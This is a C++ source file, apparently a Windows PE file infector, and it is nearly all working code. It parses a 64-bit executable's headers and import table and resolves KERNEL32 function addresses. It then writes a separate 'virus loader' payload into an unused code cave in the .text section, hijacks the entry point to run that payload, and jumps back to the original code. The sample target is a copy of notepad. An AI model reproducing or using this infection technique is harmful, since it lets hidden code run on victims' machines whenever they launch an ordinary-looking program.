#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <vector>
#include <map>

typedef long long addr_t;

#define CODE_SECTION_NAME ".text"
#define IMPORT_DIRECTORY_SECTION ".rdata"
#define RELATIVE_JUMP_INSTRUCTION 0xE9
#define RELATIVE_CALL_INSTRUCTION 0xE8
#define SIZEOF_REL32_JUMP 5
#define SIZEOF_REL32_CALL 5
#define VIRUS_LOADER_PATH "../debug/virusloader"
#define EMPTY_SECTION_MARGIN 0

// map filled with needed extern functions
std::map<std::string, std::map<std::string, addr_t>> dllToFuncNameToAddress = {
    {
        "KERNEL32.dll", 
        {
            { "CopyFileW", 0 },
            { "GetLastError", 0 },
        }
    },
};

std::vector<std::pair<std::string, std::string>> externFunctionsToFill = {
    { "KERNEL32.dll", "CopyFileW" },
    { "KERNEL32.dll", "GetLastError" },
};

void analyzeEXE(const char* exePath);

int main()
{
    std::string exePath = "../debug/notepad64 - copy.exe";
    // std::cout << "Enter exe path: ";
    // std::getline(std::cin, exePath);
    analyzeEXE(exePath.c_str());
}

addr_t base;
void writeVirusLoader(FILE* exeFile, const char* virusLoaderPath, addr_t codeSectionRawToVirtual)
{
    FILE* virusLoader = fopen(virusLoaderPath, "r");
    if (!virusLoader)
    {
        printf("Can't open virus loader file\n");
        return;
    }

    int c = fgetc(virusLoader);
    int callCounter = 0, callIndex = 0;    // 5 times 0xE8 in a row indicates an extern call (without a valid address)
    while (c != EOF)
    {
        if (c == 0x33)
            callCounter++;
        else
            callCounter = 0;
        if (callCounter == 4)
        {
            fseek(exeFile, -3, SEEK_CUR);
            auto func = externFunctionsToFill[callIndex++];
            addr_t virtualDestination = dllToFuncNameToAddress[func.first][func.second];
            addr_t virtualSource = (addr_t)ftell(exeFile) + codeSectionRawToVirtual + sizeof(DWORD);  // end of current instruction
            int relativeCall = virtualDestination - virtualSource;
            printf("jump from 0x%llX to 0x%llX: 0x%X", virtualSource, virtualDestination, relativeCall);
            fwrite(&relativeCall, sizeof(int), 1, exeFile);
            c = fgetc(virusLoader);
            continue;
        }
        // write next byte
        fputc(c, exeFile);
        c = fgetc(virusLoader);
    }

    fclose(virusLoader);
}

void freadstr(FILE* file, char* buffer, long pos)
{
    long startPos = ftell(file);

    fseek(file, pos, SEEK_SET);
    int c = fgetc(file);
    while (!feof(file) && c != 0)
    {
        *buffer++ = c;
        c = fgetc(file);
    }
    *buffer++ = 0;

    fseek(file, startPos, SEEK_SET);
}

void getExternCallAddresses(FILE* file, int importDirectoryPos, addr_t virtualRawOffset, addr_t imageBase)
{
    char nameBuffer[1000] = { 0 };

    fseek(file, importDirectoryPos + virtualRawOffset, SEEK_SET);
    IMAGE_IMPORT_DESCRIPTOR importDescriptor;
    
    // go over all DLLs
    while (true)
    {
        fread(&importDescriptor, sizeof(IMAGE_IMPORT_DESCRIPTOR), 1, file);
        if (!importDescriptor.Characteristics)
            break;

        // get name and check if there are needed extern functions in it
        freadstr(file, nameBuffer, importDescriptor.Name + virtualRawOffset);
        if (dllToFuncNameToAddress.find(nameBuffer) == dllToFuncNameToAddress.end())
            continue;
        auto& funcToAddress = dllToFuncNameToAddress[nameBuffer];

        // go over all functions
        IMAGE_THUNK_DATA64 ILT;
        fseek(file, importDescriptor.FirstThunk + virtualRawOffset, SEEK_SET);
        long offset = 0;
        while (true)
        {
            fread(&ILT, sizeof(IMAGE_THUNK_DATA64), 1, file);
            if ((ILT.u1.Ordinal & IMAGE_ORDINAL_FLAG) || !ILT.u1.AddressOfData)
                break;

            freadstr(file, nameBuffer, ILT.u1.AddressOfData + offsetof(IMAGE_IMPORT_BY_NAME, Name) + virtualRawOffset);
            if (funcToAddress.find(nameBuffer) != funcToAddress.end())
                funcToAddress[nameBuffer] = importDescriptor.FirstThunk + imageBase + offset;;

            offset += sizeof(IMAGE_THUNK_DATA64);
        }
    }
}

void analyzeEXE(const char* exePath)
{
    IMAGE_DOS_HEADER dosHeader;
    IMAGE_FILE_HEADER fileHeader;
    IMAGE_OPTIONAL_HEADER64 optHeader;
    IMAGE_SECTION_HEADER codeSectionHeader = { 0 }, currentSectionHeader;
    addr_t importDirVirtualToRaw = 0, codeSectionRawToVirtual = 0;

    FILE* file = fopen(exePath, "r+b");
    if (!file)
    {
        printf("Can't open file :(\n");
        return;
    }
    // extract pe format tables
    fread(&dosHeader, sizeof(IMAGE_DOS_HEADER), 1, file);
    
    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("Invalid magic :(\n");
        return;
    }

    // jump and read file header, optional header
    fseek(file, dosHeader.e_lfanew + sizeof(DWORD), SEEK_SET);
    fread(&fileHeader, sizeof(IMAGE_FILE_HEADER), 1, file);
    fread(&optHeader, sizeof(IMAGE_OPTIONAL_HEADER64), 1, file);

    // TEMP
    base = optHeader.ImageBase;

    fseek(file, fileHeader.SizeOfOptionalHeader - sizeof(IMAGE_OPTIONAL_HEADER64), SEEK_CUR);
    // read section headers
    int sectionCount = 0;
    for (int i = 0; i < fileHeader.NumberOfSections; i++)
    {
        fread(&currentSectionHeader, sizeof(IMAGE_SECTION_HEADER), 1, file);

        if (!strcmp((char*)currentSectionHeader.Name, CODE_SECTION_NAME))
        {
            codeSectionHeader = currentSectionHeader;
            codeSectionRawToVirtual = currentSectionHeader.VirtualAddress + optHeader.ImageBase - currentSectionHeader.PointerToRawData;
        }
        else if (!strcmp((char*)currentSectionHeader.Name, IMPORT_DIRECTORY_SECTION))
            importDirVirtualToRaw = currentSectionHeader.PointerToRawData - currentSectionHeader.VirtualAddress;
    }

    getExternCallAddresses(file, optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, importDirVirtualToRaw, optHeader.ImageBase);

    // read code section and find unused sections
    int size = 0;
    int maxSize = -1;
    int overwriteRaw = 0;
    fseek(file, codeSectionHeader.PointerToRawData, SEEK_SET);
    for (int i = 0; i < codeSectionHeader.SizeOfRawData; i++)
    {
        unsigned char b;
        fread(&b, sizeof(unsigned char), 1, file);
        if (b == 0x00)
            size++;
        else
        {
            if (size > maxSize)
            {
                maxSize = size;
                overwriteRaw = codeSectionHeader.PointerToRawData + i - size + EMPTY_SECTION_MARGIN;
            }
            size = 0;
        }
    }
    maxSize -= EMPTY_SECTION_MARGIN + SIZEOF_REL32_JUMP;
    printf("size: %d\n", maxSize);
    addr_t overwriteVirtual = codeSectionHeader.VirtualAddress - codeSectionHeader.PointerToRawData + overwriteRaw;

    // inject virus loading code
    fseek(file, overwriteRaw, SEEK_SET);

    writeVirusLoader(file, VIRUS_LOADER_PATH, codeSectionRawToVirtual);

    // write jump to original entry point
    fputc(RELATIVE_JUMP_INSTRUCTION, file);
    // jump = destination - source - instruction size
    long virtualSource = overwriteVirtual + ftell(file) - overwriteRaw;
    long jump = optHeader.AddressOfEntryPoint - virtualSource - SIZEOF_REL32_JUMP + 1;
    fwrite(&jump, sizeof(long), 1, file);
    
    // change entry point
    optHeader.AddressOfEntryPoint = overwriteVirtual;
    // rewrite updated opt header
    fseek(file, dosHeader.e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER), SEEK_SET);
    fwrite(&optHeader, sizeof(IMAGE_OPTIONAL_HEADER64), 1, file);
    
    fclose(file);
}
